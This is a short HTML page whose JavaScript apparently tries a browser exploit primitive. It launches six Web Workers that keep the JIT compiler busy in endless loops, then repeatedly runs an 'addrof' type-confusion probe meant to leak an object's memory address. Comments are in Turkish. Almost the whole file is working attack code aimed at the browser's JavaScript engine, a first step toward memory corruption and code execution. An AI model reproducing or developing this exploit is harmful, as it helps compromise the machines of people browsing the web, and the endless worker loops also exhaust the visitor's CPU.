<!DOCTYPE html>
<html><body>
<h1 id="s">Running...</h1>
<div id="log" style="font-size:16px"></div>
<script>
function log(s) {
  document.getElementById('log').innerHTML += s + '<br>';
}

var wCode = `
  function jit(o){return o.a+o.b;}
  for(var i=0;i<300000;i++) jit({a:1.1,b:2.2});
  while(true){
    var arr=[];
    for(var i=0;i<10000;i++) arr.push({a:i,b:i+1});
    jit(arr[0]);
    arr=null;
  }
`;
var u=URL.createObjectURL(new Blob([wCode],{type:'text/javascript'}));
for(var i=0;i<6;i++) new Worker(u);

// Crash öncesi addrof dene
function addrof(val) {
  var arr = [1.1, 2.2, 3.3];
  function rd(a) { return a[0]; }
  for(var i=0;i<200000;i++) rd([1.1,2.2,3.3]);
  arr[0] = val;
  return rd(arr);
}

var target = {secret: 0x1337};
var attempt = 0;
var gotIt = false;

function probe() {
  attempt++;
  try {
    var leaked = addrof(target);
    var buf = new ArrayBuffer(8);
    var dv = new DataView(buf);
    dv.setFloat64(0, leaked, true);
    var lo = dv.getUint32(0,true);
    var hi = dv.getUint32(4,true);
    var isNaN_val = (hi === 0x7ff80000 && lo === 0);
    
    if (!isNaN_val) {
      gotIt = true;
      document.getElementById('s').textContent = 
        '✅ attempt '+attempt+': 0x'+hi.toString(16)+lo.toString(16);
      return;
    }
    
    // Her 100 denemede bir log
    if (attempt % 100 === 0) {
      log('attempt '+attempt+' — still NaN');
    }
    
    if (!gotIt) setTimeout(probe, 5);
  } catch(e) {
    document.getElementById('s').textContent = 'EXCEPTION at attempt '+attempt+': '+e;
  }
}

// Workers ısınsın, sonra probe başlasın
setTimeout(probe, 3000);
</script>
</body></html>
